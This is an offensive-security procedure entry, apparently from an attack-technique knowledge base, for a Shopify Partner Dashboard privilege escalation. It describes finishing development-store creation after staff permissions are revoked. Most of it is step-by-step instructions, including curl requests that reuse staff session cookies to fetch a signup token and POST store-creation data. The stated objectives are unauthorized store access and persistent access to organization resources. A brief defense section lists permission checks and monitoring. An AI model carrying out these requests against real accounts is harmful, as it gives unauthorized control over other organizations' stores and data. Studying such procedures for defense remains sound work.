---
id: proc-shopify-complete-dev-store
tags:
  - shopify
  - store-creation
  - bypass
  - api
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/get-shopify-dev-store-token]]'
  - '[[commands/post-shopify-create-dev-store]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Privilege Escalation]]'
updated_at: '2025-12-14T17:30:35.771Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploitation for Privilege Escalation]]'
---
# Complete-Development-Store-Creation-via-UI-or-API

## Summary

This procedure finalizes the creation of a development store in Shopify after permission revocation, either through the UI for automatic login or via API calls to bypass checks entirely, resulting in unauthorized store access and resource control.

## Description

With permissions revoked, the staff continues the UI flow or uses API endpoints to obtain a token and submit creation data. The vulnerability lies in the lack of permission validation on /organizationID/stores/signup_object/dev_store and /services/signup/create, allowing completion with only general store access. This web-based exploit in the Partner Dashboard leads to full store admin access, enabling elevated actions like app installations or data modifications.

## Requirements

1. Active session from initiation step
2. Revoked permissions (managed stores only)
3. API access or UI continuation
4. Form data: shop name, email, password, organization ID

## Defense

Defensive measures and detection strategies:

- Enforce permission checks on all signup endpoints and UI completions
- Rate-limit and audit API calls to creation services
- Monitor for anomalous store creations tied to low-privilege accounts

## Objectives

1. Create and access unauthorized development store
2. Demonstrate privilege escalation via misconfiguration
3. Gain persistent access to organization resources

## Instructions

### Step 1: Continue via UI (Primary Method)

**Context**: Use browser to finish the signup form post-revocation.

**Command** (Browser UI):
```bash
# No CLI; UI:
# 1. Return to https://partners.shopify.com/organizationID/stores/new
# 2. Fill form: shop name, email, etc.
# 3. Submit and auto-login
```

> Complete process. Expected output: New store URL and login.

### Step 2: Obtain Token via API (Alternative)

**Context**: Fetch signup token without permission checks.

**Command** ([[commands/get-shopify-dev-store-token]]):
```bash
curl -X GET "https://partners.shopify.com/organizationID/stores/signup_object/dev_store" \
  -H "Cookie: [session cookies from staff login]"
```

> Token returned. Expected output: JSON with token for creation.

### Step 3: Create Store via POST (Alternative)

**Context**: Submit form data using the token to finalize.

**Command** ([[commands/post-shopify-create-dev-store]]):
```bash
curl -X POST "https://app.shopify.com/services/signup/create" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: [session cookies]" \
  -d "signup[shop_name]=newiez2&signup[email]=example@gmail.com&signup[password]=5syyyypT&signup[confirm_password]=5syyyypT&signup_source=development+shop&signup[extra][organization_id]=1022333&signup[signup_types][]=affiliate_shop"
```

> Store created. Expected output: Success response and login redirect.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[Exploitation for Privilege Escalation]] Exploitation for Privilege Escalation

### Sub-Techniques


## Commands Used

- [[commands/get-shopify-dev-store-token]]
- [[commands/post-shopify-create-dev-store]]

## Tools Used

- [[tools/curl]]

## Tags

- [[shopify]]
- [[store-creation]]
- [[bypass]]
- [[api]]
